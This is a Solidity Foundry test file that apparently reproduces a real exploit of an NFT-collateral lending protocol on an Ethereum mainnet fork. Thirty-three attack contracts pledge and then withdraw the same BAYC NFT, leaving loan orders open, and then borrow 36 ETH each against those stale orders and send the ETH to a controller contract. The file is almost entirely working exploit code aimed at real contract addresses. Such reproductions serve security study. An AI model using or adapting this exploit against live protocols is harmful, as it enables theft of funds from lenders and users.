// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IBAYC {
    function setApprovalForAll(address operator, bool _approved) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address owner);
}

interface IXNFT {
    function counter() external returns(uint256);  
    function pledgeAndBorrow(address _collection, uint256 _tokenId, uint256 _nftType, address xToken, uint256 borrowAmount) external;
    function withdrawNFT(uint256 orderId) external;
}

interface IXToken {
    function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external;
}

/* Contract: 0xa04ec2366641a2286782d104c448f13bf36b2304 */
interface IExploitToken {
     function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external;
}

interface CheatCodes {
    function startPrank(address) external;
    function startPrank(address msgsender, address txorigin) external;
    function stopPrank() external;
    function deal(address who, uint256 newBalance) external;
    function roll(uint256) external;
}

contract attackContract is Test {
    
    IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    IXNFT XNFT = IXNFT(0xb14B3b9682990ccC16F52eB04146C3ceAB01169A);
    IXToken XToken = IXToken(0xB38707E31C813f832ef71c70731ed80B45b85b2d);
    IExploitToken ExploitToken = IExploitToken(0xA04EC2366641a2286782D104C448f13bF36B2304);

    uint256 orderId = 0;

    constructor() {
        BAYC.setApprovalForAll(tx.origin, true);
    }

    function pledgeNFT() public {
        BAYC.setApprovalForAll(address(XNFT), true);
        XNFT.pledgeAndBorrow(address(BAYC), 5110, 721, address(ExploitToken), 0);
        orderId = XNFT.counter();
        assert(orderId >= 11);
        XNFT.withdrawNFT(orderId);

        BAYC.transferFrom(address(this), msg.sender, 5110);
    }

    function borrowETH() public {
        XToken.borrow(orderId, payable(address(this)), 36 ether);
        payable(msg.sender).transfer(address(this).balance);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable{}
}

contract attackControllerContract is Test {
    address attacker = 0xb7CBB4d43F1e08327A90B32A8417688C9D0B800a;
    
    IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address payable[33] public attacks;

    function setUp() public {
        cheat.deal(address(this), 0);
        emit log_named_decimal_uint('The ETH balance of the Attack Controller Contract', address(this).balance, 18);

        emit log_string('The attacker send BAYC5110 to the attack contract');
        cheat.roll(15028846);
        cheat.startPrank(attacker);
        BAYC.transferFrom(attacker, address(this), 5110);
        cheat.stopPrank();

    }

    function testExploit() public {
        cheat.startPrank(address(this), attacker);

        emit log_string('Pledge NFT record');
        
        for (uint8 i = 0; i < attacks.length; ++i){
            attackContract attack = new attackContract();
            cheat.deal(address(attack), 0);
            attacks[i] = payable(address(attack));
            BAYC.transferFrom(address(this), address(attacks[i]), 5110);
            require(BAYC.ownerOf(5110) == attacks[i], 'BAYC 5110 transfer failed');
            attack.pledgeNFT();
        }

        emit log_string('borrow ETH');
        for (uint8 i = 0; i < attacks.length; ++i){
            attacks[i].call(abi.encodeWithSignature("borrowETH()"));
        }

        emit log_named_decimal_uint('The ETH balance of the Attack Controller Contract', address(this).balance, 18);

    }

    receive() external payable{}
}
